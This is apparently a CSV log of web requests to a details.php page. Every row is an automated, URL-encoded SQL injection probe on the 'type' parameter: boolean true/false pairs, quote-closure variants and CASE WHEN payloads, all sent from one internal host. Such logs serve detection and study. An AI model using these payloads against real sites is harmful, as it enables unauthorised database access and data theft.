full_url,event_time,hostname
/details.php?prod=5&type=2%29%29%20AND%206058%3D6275--%20-,1680093125.561295,10.0.2.31
/details.php?prod=5&type=2%29%29%20AND%201215%3D1215--%20-,1680093125.566205,10.0.2.31
/details.php?prod=5&type=2%20AND%205669%3D9841--%20-,1680093125.57046,10.0.2.31
/details.php?prod=5&type=2%20AND%201215%3D1215--%20-,1680093125.579257,10.0.2.31
/details.php?prod=5&type=2%27%29%20AND%201967%3D7381--%20-,1680093125.586012,10.0.2.31
/details.php?prod=5&type=2%27%29%20AND%201215%3D1215--%20-,1680093125.589673,10.0.2.31
/details.php?prod=5&type=2%27%29%29%20AND%207084%3D3648--%20-,1680093125.602478,10.0.2.31
/details.php?prod=5&type=2%27%29%29%20AND%201215%3D1215--%20-,1680093125.606476,10.0.2.31
/details.php?prod=5&type=2%27%20AND%205006%3D6519--%20-,1680093125.610819,10.0.2.31
/details.php?prod=5&type=2%27%20AND%201215%3D1215--%20-,1680093125.614109,10.0.2.31
/details.php?prod=5&type=2%25%27%20AND%202371%3D4521--%20-,1680093125.619888,10.0.2.31
/details.php?prod=5&type=2%25%27%20AND%201215%3D1215--%20-,1680093125.623103,10.0.2.31
/details.php?prod=5&type=2%22%29%20AND%206749%3D2711--%20-,1680093125.627757,10.0.2.31
/details.php?prod=5&type=2%22%29%20AND%201215%3D1215--%20-,1680093125.632054,10.0.2.31
/details.php?prod=5&type=2%22%20AND%203973%3D5645--%20-,1680093125.636154,10.0.2.31
/details.php?prod=5&type=2%22%20AND%201215%3D1215--%20-,1680093125.639631,10.0.2.31
/details.php?prod=5&type=%28SELECT%20%28CASE%20WHEN%20%282756%3D1612%29%20THEN%202%20ELSE%20%28SELECT%201612%20UNION%20SELECT%202191%29%20END%29%29,1680093125.643685,10.0.2.31
/details.php?prod=5&type=%28SELECT%20%28CASE%20WHEN%20%288554%3D8554%29%20THEN%202%20ELSE%20%28SELECT%205179%20UNION%20SELECT%206198%29%20END%29%29,1680093125.646841,10.0.2.31
/details.php?prod=5&type=%28CASE%20WHEN%20%285698%3D4582%29%20THEN%205698%20ELSE%205698%2A%28SELECT%205698%20FROM%20DUAL%20UNION%20SELECT%204582%20FROM%20DUAL%29%20END%29,1680093125.651401,10.0.2.31
/details.php?prod=5&type=%28CASE%20WHEN%20%284726%3D4726%29%20THEN%204726%20ELSE%204726%2A%28SELECT%204726%20FROM%20DUAL%20UNION%20SELECT%209486%20FROM%20DUAL%29%20END%29,1680093125.666968,10.0.2.31
/details.php?prod=5&type=%28CASE%20WHEN%206130%3D9727%20THEN%206130%20ELSE%20NULL%20END%29,1680093125.671824,10.0.2.31
/details.php?prod=5&type=%28CASE%20WHEN%209099%3D9099%20THEN%209099%20ELSE%20NULL%20END%29,1680093125.676906,10.0.2.31
/details.php?prod=5&type=%28SELECT%20CONCAT%28CONCAT%280x7176787171%2C%28CASE%20WHEN%20%289673%3D9673%29%20THEN%200x31%20ELSE%200x30%20END%29%29%2C0x7178706a71%29%29,1680093125.688822,10.0.2.31
/details.php?prod=5&type=2%29%20AND%209849%3D5519%23,1680093125.694248,10.0.2.31
/details.php?prod=5&type=2%29%20AND%202569%3D2569%23,1680093125.698166,10.0.2.31
